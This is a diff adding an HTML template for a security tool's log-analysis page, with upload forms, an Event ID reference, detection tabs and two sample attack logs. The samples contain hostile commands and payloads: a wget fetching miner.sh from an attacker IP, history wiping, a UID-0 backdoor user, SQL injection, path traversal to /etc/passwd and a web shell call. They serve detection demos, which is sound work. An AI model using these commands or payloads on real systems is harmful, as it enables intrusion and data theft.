@@ -1,0 +1,264 @@
+{% extends "base.html" %}
+{% from "_macros.html" import badge, risk_panel, findings_list, ai_block, ioc_table, case_selector, ai_toggle, empty_state with context %}
+{% block title %}Log Analysis — {{ APP_NAME }}{% endblock %}
+{% block page_title %}📜 Log Analysis{% endblock %}
+{% block page_sub %}Detect intrusions in Windows, Linux, web server and firewall logs{% endblock %}
+
+{% block content %}
+
+<div class="grid g2">
+  <div class="card">
+    <div class="card-head"><div class="card-title">📤 Analyse a Log File</div></div>
+    <form method="post" enctype="multipart/form-data" data-loading>
+      <input type="hidden" name="action" value="file">
+      <div class="field">
+        <label>Log file (.log, .txt, .csv, .evtx, .json)</label>
+        <input type="file" name="file">
+      </div>
+      <div class="field">
+        <label>…or paste log content directly</label>
+        <textarea name="logtext" rows="7" placeholder="Paste log lines here…"></textarea>
+      </div>
+      {{ case_selector(open_cases) }}
+      {{ ai_toggle() }}
+      <button type="submit" class="btn mt" data-loading="Analyzing…">🔍 Analyse Logs</button>
+    </form>
+    <div class="alert alert-info mt"><span>🤖</span>
+      <div><b>Auto-detected formats:</b> Windows Event Logs (EVTX + text/CSV exports),
+      Linux auth.log/syslog/secure, Apache &amp; Nginx access logs, iptables/UFW/pfSense firewall
+      logs, and JSON-lines. No configuration needed.</div></div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="card-title">🔎 Look Up a Windows Event ID</div></div>
+    <form method="post">
+      <input type="hidden" name="action" value="event">
+      <div class="field">
+        <label>Event ID</label>
+        <input type="text" name="event_id" placeholder="4625" class="mono" id="eidInput">
+      </div>
+      {{ ai_toggle() }}
+      <button type="submit" class="btn btn-ghost mt">Explain Event ID</button>
+    </form>
+    <div class="chips mt">
+      <span class="dim xs" style="align-self:center">Common:</span>
+      {% for eid in ['4624','4625','4634','4672','4720','4732','4740','1102','7045','4698','4104','1116'] %}
+      <button type="button" class="chip" data-fill="{{ eid }}" data-fill-target="#eidInput">{{ eid }}</button>
+      {% endfor %}
+    </div>
+
+    {% if event_info %}
+    <div class="alert {{ 'alert-warn' if event_info.severity in ['high','critical'] else 'alert-info' }} mt">
+      <span>📋</span>
+      <div><b>Event ID {{ event_info.event_id }}: {{ event_info.name }}</b>
+        {{ badge(event_info.severity if event_info.severity in ['critical','high','medium','low'] else 'info') }}</div>
+    </div>
+    {% if event_info.ai_explanation %}
+    <div class="ai-box">
+      <div class="ai-head">🤖 AI Explanation</div>
+      <div class="ai-body" id="eidAI"></div>
+    </div>
+    {% endif %}
+    {% endif %}
+  </div>
+</div>
+
+{% if result %}
+
+{{ risk_panel(result.risk_score, 'Log Risk: ' ~ result.band|title,
+   result.log_type_label ~ ' — ' ~ result.total_lines ~ ' lines, ' ~ result.parsed_records ~
+   ' records parsed, ' ~ result.findings|length ~ ' detection(s) raised.') }}
+
+<div class="tabs" data-tabs data-scope="#logPanes">
+  <button class="tab active" data-tab="det">Detections ({{ result.findings|length }})</button>
+  <button class="tab" data-tab="tl">Timeline ({{ result.timeline|length }})</button>
+  <button class="tab" data-tab="stat">Statistics</button>
+  <button class="tab" data-tab="ioc">IOCs</button>
+  <button class="tab" data-tab="raw">Raw Sample</button>
+</div>
+
+<div id="logPanes">
+  <div class="tabpane active" data-pane="det">
+    <div class="card">
+      {% for f in result.findings %}
+      <div class="finding {{ f.severity }}">
+        <span class="f-icon">{% if f.severity=='critical' %}🔴{% elif f.severity=='high' %}🟠{% elif f.severity=='medium' %}🟡{% else %}🟢{% endif %}</span>
+        <div class="f-body">
+          <div class="f-title">{{ f.title }}</div>
+          <div class="f-detail">{{ f.detail }}</div>
+          {% if f.evidence %}
+          <div class="pre mt-s" style="max-height:120px;font-size:10.8px">{% for ev in f.evidence %}{{ ev }}
+{% endfor %}</div>
+          {% endif %}
+        </div>
+        {% if f.points %}<span class="f-pts">+{{ f.points }}</span>{% endif %}
+      </div>
+      {% else %}
+        <div class="alert alert-ok"><span>✅</span><div>No security detections raised for this log.</div></div>
+      {% endfor %}
+    </div>
+    {{ ai_block(result.ai, 'AI Incident Analysis') }}
+  </div>
+
+  <div class="tabpane" data-pane="tl">
+    <div class="card">
+      <div class="card-head"><div class="card-title">⏱️ Event Timeline</div></div>
+      {% if result.timeline %}
+      <div class="tline">
+        {% for t in result.timeline %}
+        <div class="tl-item {{ t.severity }}">
+          <div class="tl-t">{{ t.ts or 'unknown time' }} · {{ t.source }} {{ badge(t.severity if t.severity in ['critical','high','medium','low'] else 'info') }}</div>
+          <div class="tl-e">{{ t.event }}</div>
+        </div>
+        {% endfor %}
+      </div>
+      {% else %}{{ empty_state('⏱️','No timeline events extracted') }}{% endif %}
+    </div>
+  </div>
+
+  <div class="tabpane" data-pane="stat">
+    <div class="card">
+      <div class="card-head"><div class="card-title">📊 Log Statistics</div></div>
+      <div class="grid g2">
+        {% for key, rows in result.stats.items() %}
+          {% if rows is iterable and rows is not string and rows is not number %}
+          <div>
+            <div class="card-title" style="font-size:13px">{{ key|replace('_',' ')|title }}</div>
+            <div class="tbl-wrap mt-s">
+            <table>
+              <thead><tr>
+                {% if rows and rows[0] is mapping %}{% for k in rows[0].keys() %}<th>{{ k|title }}</th>{% endfor %}{% endif %}
+              </tr></thead>
+              <tbody>
+              {% for r in rows[:20] %}
+                {% if r is mapping %}
+                <tr>{% for v in r.values() %}<td class="mono small">{{ v }}</td>{% endfor %}</tr>
+                {% endif %}
+              {% endfor %}
+              </tbody>
+            </table>
+            </div>
+          </div>
+          {% endif %}
+        {% endfor %}
+      </div>
+      <dl class="kv mt">
+        {% for key, val in result.stats.items() %}
+          {% if val is number or val is string %}
+          <dt>{{ key|replace('_',' ')|title }}</dt><dd>{{ val }}</dd>
+          {% endif %}
+        {% endfor %}
+        <dt>Total lines</dt><dd>{{ result.total_lines }}</dd>
+        <dt>Parsed records</dt><dd>{{ result.parsed_records }}</dd>
+        <dt>Detected format</dt><dd>{{ result.log_type_label }}</dd>
+      </dl>
+    </div>
+  </div>
+
+  <div class="tabpane" data-pane="ioc">
+    <div class="card">
+      <div class="card-head"><div class="card-title">🎯 Extracted Indicators</div></div>
+      {{ ioc_table(result.iocs) }}
+    </div>
+  </div>
+
+  <div class="tabpane" data-pane="raw">
+    <div class="card">
+      <div class="card-head"><div class="card-title">📄 Raw Log Sample</div>
+        <span class="dim xs">First 60 lines</span></div>
+      <div class="pre">{% for l in result.sample_lines %}{{ l }}
+{% endfor %}</div>
+    </div>
+  </div>
+</div>
+
+{% else %}
+
+<div class="grid g2">
+  <div class="card">
+    <div class="card-head"><div class="card-title">🚨 What This Module Detects</div></div>
+    {% for icon, t, d in [
+      ('🔨','Brute force','Many failed logons for one account, followed by a success = compromise.'),
+      ('💧','Password spraying','A few attempts across many accounts to dodge lockout thresholds.'),
+      ('👑','Privilege escalation','New admin accounts, group additions, sudo abuse, token manipulation.'),
+      ('💉','Web attacks','SQLi, XSS, LFI, RCE, Log4Shell, web shells and scanner traffic.'),
+      ('🔍','Reconnaissance','Port scans, directory enumeration, 404 bursts, tool user-agents.'),
+      ('📤','Data exfiltration','Unusually large responses and transfers to external hosts.'),
+      ('🧹','Anti-forensics','Cleared audit logs (Event 1102), wiped history, disabled firewalls.'),
+      ('🌙','Off-hours activity','Administrative actions at 3 a.m. that nobody scheduled.'),
+      ('🖥️','Exposed RDP','Remote-interactive logons from public IP addresses.') ] %}
+    <div class="finding info"><span class="f-icon">{{ icon }}</span>
+      <div class="f-body"><div class="f-title">{{ t }}</div><div class="f-detail">{{ d }}</div></div></div>
+    {% endfor %}
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="card-title">📋 Windows Event ID Reference</div></div>
+    <div class="tbl-wrap" style="max-height:520px;overflow-y:auto">
+    <table>
+      <thead><tr><th>ID</th><th>Meaning</th><th>Severity</th></tr></thead>
+      <tbody>
+      {% for eid, info in common_events %}
+      <tr><td class="mono"><b>{{ eid }}</b></td><td class="small">{{ info[0] }}</td>
+          <td>{{ badge(info[1] if info[1] in ['critical','high','medium','low'] else 'info') }}</td></tr>
+      {% endfor %}
+      </tbody>
+    </table>
+    </div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-head"><div class="card-title">🧪 Try It — Paste This Sample</div></div>
+  <div class="grid g2">
+    <div>
+      <div class="card-title" style="font-size:13px">Linux SSH brute force → compromise</div>
+      <div class="pre mt-s" id="sampleLinux">Mar 15 02:14:22 webserver sshd[2891]: Failed password for root from 203.0.113.45 port 51234 ssh2
+Mar 15 02:14:25 webserver sshd[2893]: Failed password for root from 203.0.113.45 port 51236 ssh2
+Mar 15 02:14:28 webserver sshd[2895]: Failed password for admin from 203.0.113.45 port 51238 ssh2
+Mar 15 02:14:31 webserver sshd[2897]: Failed password for invalid user oracle from 203.0.113.45 port 51240 ssh2
+Mar 15 02:14:34 webserver sshd[2899]: Failed password for invalid user postgres from 203.0.113.45 port 51242 ssh2
+Mar 15 02:14:37 webserver sshd[2901]: Failed password for root from 203.0.113.45 port 51244 ssh2
+Mar 15 02:14:40 webserver sshd[2903]: Failed password for root from 203.0.113.45 port 51246 ssh2
+Mar 15 02:14:43 webserver sshd[2905]: Failed password for root from 203.0.113.45 port 51248 ssh2
+Mar 15 02:19:02 webserver sshd[2951]: Accepted password for root from 203.0.113.45 port 51302 ssh2
+Mar 15 02:19:03 webserver sshd[2951]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Mar 15 02:20:11 webserver useradd[2988]: new user: name=svcbackup, UID=0, GID=0, home=/home/svcbackup
+Mar 15 02:20:44 webserver usermod[2994]: add 'svcbackup' to group 'sudo'
+Mar 15 02:21:30 webserver sudo:  svcbackup : COMMAND=/usr/bin/wget http://203.0.113.45/miner.sh
+Mar 15 02:22:05 webserver sudo:  svcbackup : COMMAND=/bin/bash -c history -c
+Mar 15 02:22:40 webserver crontab[3021]: (svcbackup) BEGIN EDIT (svcbackup)</div>
+      <button class="btn btn-ghost btn-sm mt-s" onclick="useSample('sampleLinux')">Use this sample</button>
+    </div>
+    <div>
+      <div class="card-title" style="font-size:13px">Apache web attack chain</div>
+      <div class="pre mt-s" id="sampleWeb">198.51.100.23 - - [15/Mar/2026:03:12:01 +0530] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 200 4821 "-" "sqlmap/1.7"
+198.51.100.23 - - [15/Mar/2026:03:12:04 +0530] "GET /index.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 9134 "-" "sqlmap/1.7"
+198.51.100.23 - - [15/Mar/2026:03:12:33 +0530] "GET /admin/ HTTP/1.1" 404 209 "-" "gobuster/3.6"
+198.51.100.23 - - [15/Mar/2026:03:12:34 +0530] "GET /backup/ HTTP/1.1" 404 209 "-" "gobuster/3.6"
+198.51.100.23 - - [15/Mar/2026:03:12:35 +0530] "GET /.git/config HTTP/1.1" 200 481 "-" "gobuster/3.6"
+198.51.100.23 - - [15/Mar/2026:03:12:36 +0530] "GET /.env HTTP/1.1" 200 1203 "-" "gobuster/3.6"
+198.51.100.23 - - [15/Mar/2026:03:13:10 +0530] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 2317 "-" "curl/8.2"
+198.51.100.23 - - [15/Mar/2026:03:14:55 +0530] "POST /upload.php HTTP/1.1" 200 312 "-" "curl/8.2"
+198.51.100.23 - - [15/Mar/2026:03:15:02 +0530] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 44 "-" "curl/8.2"
+198.51.100.23 - - [15/Mar/2026:03:16:20 +0530] "GET /export/customers.csv HTTP/1.1" 200 48211934 "-" "curl/8.2"</div>
+      <button class="btn btn-ghost btn-sm mt-s" onclick="useSample('sampleWeb')">Use this sample</button>
+    </div>
+  </div>
+</div>
+{% endif %}
+
+{% endblock %}
+
+{% block scripts %}
+<script>
+function useSample(id){
+  const ta = document.querySelector('textarea[name=logtext]');
+  ta.value = document.getElementById(id).textContent;
+  ta.scrollIntoView({behavior:'smooth', block:'center'});
+}
+{% if event_info and event_info.ai_explanation %}
+document.getElementById('eidAI').innerHTML = mdToHtml({{ event_info.ai_explanation|tojson }});
+{% endif %}
+</script>
+{% endblock %}
